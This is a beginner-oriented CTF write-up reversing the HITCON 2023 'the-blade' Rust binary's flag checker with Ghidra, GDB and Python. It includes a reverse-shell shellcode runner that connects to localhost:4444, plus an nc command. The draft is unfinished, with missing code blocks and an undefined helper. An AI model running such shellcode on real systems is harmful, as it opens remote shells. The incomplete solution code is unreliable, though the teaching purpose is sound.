My first Rust {% tag "rev", "reverse" %} solve! Though in hindsight, not much Rust knowledge was needed.

This writeup is also intended for beginners. I‚Äôll be taking a didactic approach to this writeup, with some sections starting with questions for guidance.^[Also, a good excuse for me to introduce !!spoilers!! to this site!] Anytime there's a set of questions, feel free to pause, challenge yourself, and try thinking through them. :) If you want to follow along, you can grab the challenge binary [*here*](https://github.com/wxrdnx/HITCON-2023-Challenges/tree/main/the-blade).

I'll be mainly using [ghidra](https://ghidra-sre.org/) as my decompiler, along with GDB + GEF. You may find a [GDB cheatsheet](/posts/gdb-cheatsheet) I recently posted to be helpful.

## Description

## Writeup

### Running the Server

Let‚Äôs start by running the binary. We can get a feel by navigating the program with `help` and other commands.

Turns out we‚Äôre given a C2 (Command and Control) interface which sends shellcodes. Imagine we control a compromised machine. By running a malicious shellcode, we can trigger a reverse shell to our server, so that we can easily send more commands from the server.

Anyhow, we can start the server with:

```txt
server
run
```

We‚Äôre told to run some shellcode on the ‚Äúclient‚Äù. By default, this starts a connection to `localhost:4444`.

- A simple alternative is to run `nc localhost 4444` (on a separate shell). This will initiate a connection to the server, but it won‚Äôt have the same effect as the shellcode.
- To run the shellcode, we can compile a simple C program containing the shellcode and execute it.

```c
#include <stdio.h>
#include <stdlib.h>

int main()
{
    unsigned char shellcode[] = "\xeb\x10\x31\xc0\x53\x5f\x49\x8d\x77\x10\x48\x31\xd2\x80\xc2\xff\x0f\x05\x6a\x29\x58\x99\x6a\x02\x5f\x6a\x01\x5e\x0f\x05\x50\x5b\x48\x97\x68\x7f\x00\x00\x01\x66\x68\x11\x5c\x66\x6a\x02\x54\x5e\xb2\x10\xb0\x2a\x0f\x05\x4c\x8d\x3d\xc5\xff\xff\xff\x41\xff\xe7";
    ((void (*)(void))(shellcode))();
}

// Compile with:
// gcc main.c  -fno-stack-protector -z execstack && gdb ./a.out
```

TODO: check for spoilers

After running, then what? The commands don‚Äôt seem to reveal much, and at this point it‚Äôs a bit guessy. Time to turn to a decompiler.

### Identifying Interest Points

- What command triggers the flag checker?
- Where is the flag processed?
- How is the flag processed?

According to the description, the program contains a flag checker. So presumably we pass the flag as input at some point. But *where* and *how*?

By running `strings`, we find an interesting set of strings: `?flag`, `?help`, `?exit`, `?quit`. This pattern can‚Äôt be a coincidence.

In your favourite decompiler, do a search for the bytes `?flag`. If you can‚Äôt find it, try playing with endian settings. This should lead you to !!`seccomp_shell::shell::prompt()`!!.

Under the condition checking for flag, we‚Äôre led to !!`seccomp_shell::shell::verify()`!!.

{% alert "info" %}
Although strings shows `?flag` as the full string, the actual string is just `flag`. Questionable, no? This is because the byte before `flag` happens to be `\x22` (i.e. `?`). `strings` doesn‚Äôt know better, because it doesn‚Äôt actually disassemble the program.
{% endalert %}

So how is the flag actually processed? This requires a careful study of !!`verify()`!!, with a touch of dynamic analysis and experimentation.

Like most flag checkers, it turns out we just pass the flag as input (alongside the `flag` command).

```
flag hitcon{AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNN}
```

And like most flag checkers, we‚Äôre immediately hit with ‚Äú*Incorrect*‚Äù.

Detail: 

Glancing at the start of `verify()`, we also get some hints about the flag's length...

...64.

```c
if (param_3 != 0x40) {
	auVar27 = <>::from("incorrect/",9);
	return auVar27;
}
```

### Reversing the Encryption

Time to play the UNO reverse card on this binary!

- There are 3 parts to the encryption. What addresses do they begin and end?
- What is each part doing?

Let‚Äôs recognise some highs level patterns.

It‚Äôs easy to be intimidated by the multitude of loops; but really, half the loops are the same, just wearing different clothes.

There are the 3 parts to the encryption:
- Permutation (`112d10` ‚Äì¬†`113017`).
- Mapping (`113020` ‚Äì¬†`11309c`).
- Shellcode arithmetic (`11310e` ‚Äì¬†`1133a5`).

The procedure is roughly:

```python
for _ in range(256):
	permute(flag) # Index map.
	func(flag)    # Value map.

shellcode(flag, data)
```

Thankfully, these operations are all reversible.

### 1. Reversing the Permutation

{% image "https://media0.giphy.com/media/NusOH30J7QiJy/giphy.gif", "Even cats can catch sneaky permutations!", "post1 w-80" %}

Address: `112d10` ‚Äì¬†`113017`.

Eight loops, doing pretty much the same thing. Let‚Äôs focus on the first one.

```c
memcpy(&some_buffer,&SOME_ADDRESS,0x200);
n = 0x40;
puVar21 = (ulong *)&some_buffer_offset_by_4;
do {
	uVar23 = puVar21[-1];
	if (0x3f < uVar23)
		goto panic;
	uVar1 = __ptr[n - 1]; // __ptr :: char[]
	__ptr[n - 1] = __ptr[uVar23];
	__ptr[uVar23] = uVar1;
	
	uVar23 = puVar21[0];
	if (0x3f < uVar23)
		goto panic;
	uVar1 = __ptr[n - 2];
	__ptr[n - 2] = __ptr[uVar23];
	__ptr[uVar23] = uVar1;
	
	puVar21 += 2;
	n -= 2;
} while (n != 0);
```

<sup>(Some variables are renamed for clarity.)</sup>


Does this look familiar?

It‚Äôs good ol‚Äô swap! (Though slightly [*unrolled*](https://en.wikipedia.org/wiki/Loop_unrolling).) There are eight of these loops, the only difference being the `memcpy` source.

So how do we reverse this? Generally, there are two approaches to take:

- Static analysis. This means we reverse the binary by looking at the bytecode, assembly, decompiler, etc. We don't run or emulate anything.
- Dynamic analysis. In this approach, we observe the program's behaviour by running it. Common tools are `gdb`, `strace`, and `ltrace`.

Approaching this statically seems faster, but error-prone. For example, what does `memcpy(&some_buffer,"/",0x200);` even mean??? Copy 512 slashes? Copy 1 slash and 511 null-bytes? Or are Rust semantics not easily decompiled?

For fun (and practice), we'll go the dynamic route. Let's insert some breakpoints, input our flag of !!64 unique characters (e.g. Base64 alphabet)!!, grab the permuted string, and construct a mapping.

In GDB:

```sh
> start
# Break to determine __ptr location.
> break *_ZN13seccomp_shell5shell6verify17h898bf5fa26dafbabE + 61
# Break to grab permuted string.
> break *_ZN13seccomp_shell5shell6verify17h898bf5fa26dafbabE + 935
> continue
server
run
flag abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/
> # (breakpoint triggered)
# Get location of __ptr.
> p $rax
$1 = 0x5555555d63e0
> continue
> # (breakpoint triggered)
# Get permuted string.
> x/s 0x5555555d63e0
Rp5v+AZmM8XWy1sgNhTB/oCzYVdPrGn6KD3Q9lke4qtFxHb0uUOcS2jIEJfL7aiw
```

All that's left is to match the characters.

```python
import string

p = string.ascii_letters + string.digits + '+/'
assert len(p) == 64
print(p)

# Permuted string obtained from GDB.
permuted = 'Rp5v+AZmM8XWy1sgNhTB/oCzYVdPrGn6KD3Q9lke4qtFxHb0uUOcS2jIEJfL7aiw'[:64]

perm = [0] * 64  # Permutation 
rperm = [0] * 64 # Reverse permutation

for i, c in enumerate(p):
	j = permuted.index(c)
	perm[i] = j
	rperm[j] = i
```

First part done!

### 2. Constructing An Inverse Map

Address: `113020` ‚Äì¬†`11309c`,

Reversing this part is similar to reversing permutation. We can approach it statically, but overflow and types are tricky to reverse. So again, we'll go dynamic!

Let's start with some basic GDB analysis:

- What breakpoints should we add to check the result of one map iteration?
- What memory location should we examine?
- (And after all that, can you derive the mapping function?)

{% details "Oh where to go?" %}

We'll break after !!the loop, at `11309e`!!.
```sh
> break *_ZN13seccomp_shell5shell6verify17h898bf5fa26dafbabE + 1070
```

As for memory location, the code still modifies `__ptr`, so we'll read from the same location.

```sh
x/16wx 0x5555555d63e0
```
{% enddetails %}

Two things I'd like to point out:

1. Previously, we used `x/s` to print a string from memory. This time, I used `x/16wx` to print bytes, since some mapped bytes aren't printable.^[A better specifier would be `x/64bd`. This displays 64 `d`ecimal `b`ytes, and is more convenient to parse in Python. But I chose `x/16wx` since I didn't know better at the time and caused myself extra pain. ü•≤]
2. There's another problem... previously, we input the bytes through `flag <bytes>`, and this is great if we're using printable chars. But what about *non-printable* chars? There are different solutions around this:
	- Employ [GDB input tricks](/posts/gdb-cheatsheet/#input-non-printable-characters).
	- Track cycles of characters.
	- Break before mapping, and hard-code `__ptr` by [modifying its memory](/posts/gdb-cheatsheet/#modify-memory).

   Y'know what? Let's go with the last option!

```sh
> start
# Break before the loop.
> break *_ZN13seccomp_shell5shell6verify17h898bf5fa26dafbabE + 937
# Break after the loop.
> break *_ZN13seccomp_shell5shell6verify17h898bf5fa26dafbabE + 1070
> continue
> # (breakpoint-before-loop triggered)

# Set 8x8 = 64 bytes. (I used a Python script to generate these `set` cmds.)
> set *(0x5555555d63e0 as *mut u64) = 0x0001020304050607
> set *(0x5555555d63e8 as *mut u64) = 0x08090a0b0c0d0e0f
# and so on...
> set *(0x5555555d6410 as *mut u64) = 0x3031323334353637
> set *(0x5555555d6418 as *mut u64) = 0x38393a3b3c3d3e3f

> continue
> # (breakpoint-after-loop triggered)

# Get mapped bytes.
> x/16wx 0x5555555d63e0

# Repeat until all mappings are deduced...
```

Finished gathering data? Let's analyse it!

```python
# Values obtained with `x/16wx 0x5555555d63e0`.

# Values before mapping.

**What is a bijection?**

A **bijection** is a function where...
- each input maps to a *unique* output. (injective)
- each possible output is mapped from a corresponding input. Specifically, every value in the function's range has a mapping. (surjective)

This characteristic is crucial as it *guarantees* an **invertible operation**.

### 3. Cracking the Shellcode

Address: `11310e` ‚Äì¬†`1133a5`.

The final part. Subtle, but delectable.

Notice how 255 bytes are loaded into a `vec`? Guess what? That also happens to be a shellcode!

```c
local_278 = alloc::raw_vec::RawVec<T,A>::allocate_in(0xff,0);
memcpy(local_278._0_8_,&DAT_00162b2b,0xff);
local_268 = 0xff;
```

We can disassemble it with `pwntools.disasm` to get the following ASM.

{% alert "warning" %}
Small caveat: you'll want to set `context.arch = 'amd64'` for `disasm` to interpret the shellcode correctly. In the disassembly, we see our two points of insertion (`0xdeadbeef`) treated as values, so `amd64` is probably the right choice.
{% endalert %}

```

I've included the juiciest part above (with my annotations). Essentially, we perform several reversible operations (add, xor, ror, not) on 4 bytes of input; and the result is checked against 4 bytes of static data. Finally, it sets `rax = 1` if correct, and `rax = 0` if false.

In the calculations, three mystery values (`r12`, `r13`, `r14`) are used. These were computed in the preceding shellcode.

In case you'd like to have a stab at dissecting the assembly, the full (unblemished) shellcode is in the box below. Try to figure out what `r12`, `r13`, and `r14` are!

It turns out `r12` and `r13` are just the first 4 bytes of !!`/bin/sh`!! and !!`/etc/passwd`!!, which is respectively !!`\x7fELF`!! and !!`root`!!. These correspond to !!`0x464c457f`!! and !!`0x746f6f72`!! in little endian. And `r14` is just !!`0x31f3831f`!!, computed with a bit of arithmetic. Armed with these 3 values, we can now reverse the encryption.

```python
def ror(x, n):
    left = x >> n
    right = (x & (0xFFFFFFFF >> (32 - n))) << (32 - n)
    return right | left

def neg(x):
    assert x >= 0
    return int(''.join('01'[c == '0'] for c in f'{x:032b}'), 2)

r12 = 0x464c457f
r13 = 0x746f6f72
r14 = 0x31f3831f

def shelldec(b):
    """Reverse shellcode encryption (decryption)."""
    assert b >= 0
    return ((ror(neg(b ^ r14), 32 - 0xb) ^ r13) - r12) % 2**32

byteorder = 'little'

# `encrypted` words obtained from 160010 to 16004f.
encrypted = [0x526851a7, 0x31ff2785, 0xc7d28788, 0x523f23d3, 0xaf1f1055, 0x5c94f027, 0x797a3fcd, 0xe7f02f9f, 0x3c86f045, 0x6deab0f9, 0x91f74290, 0x7c9a3aed, 0xdc846b01, 0x743c86c, 0xdff7085c, 0xa4aee3eb,]
decrypted = [shelldec(u) for u in encrypted]
```


### Tying it All Together

All that's left is to tie the three parts together.

```python
bs = b''.join(u.to_bytes(4, byteorder) for u in decrypted)

for i in range(256):
    bs = apply_rmp(bs)
    bs = apply_rperm(bs)

print(bs.decode())
```

## Debugging Our Mess

Some small tips on debugging.

Sometimes the solution is simple and straightforward. But occasionally, we make programming mistakes or misunderstand the problem. Debugging code can be painful.

- Prove inverse function holds. Sounds mathy, but the basic principle is to check if our *reversed output* equals our *input*. In math terms: `f(g(x)) = g(f(x)) = x`, where `g` is the inverse of `f`. If it's not equal, clearly we messed up somewhere.
	- This is useful for the second part (mapping), because our domain is small, just 0 - 255.
	- For example, with shellcode encryption, we can do a forward pass, to make sure we're getting the same data.
	```python
	def shellenc(a):
		"""Forward shell encryption."""
		assert a >= 0
		u32 = lambda x: x & 0xFFFFFFFF 
		return neg(ror(u32(a + r12) ^ r13, 0xb)) ^ r14

	assert encrypted == [shellenc(v) for v in decrypted]
	```
- Use `assert`s. Great for intermediate checks.
- Verify assumptions with dynamic analysis.
    For example, I had falsely assumed in the shellcode that `r12 == 0`, since seemed to be pushed by the assembly. But as we found out, `r12 == L"FLE\x7f"`.
    However, be wary of the [observer effect](https://en.wikipedia.org/wiki/Observer_effect_(information_technology)), where the program changes behaviour when observed. I haven't seen this much in CTFs, but it's certain to be out there...

## Final Remarks

It's easy to miss things out. I know I did. Lots of hair was lost until I realised I left out the shellcode. I also tried to search the shellcode on ExploitDB, but no luck, because it was hand-spun.

But overall, a sweet challenge. And one that left me with nice rave music to power me through Saturday.
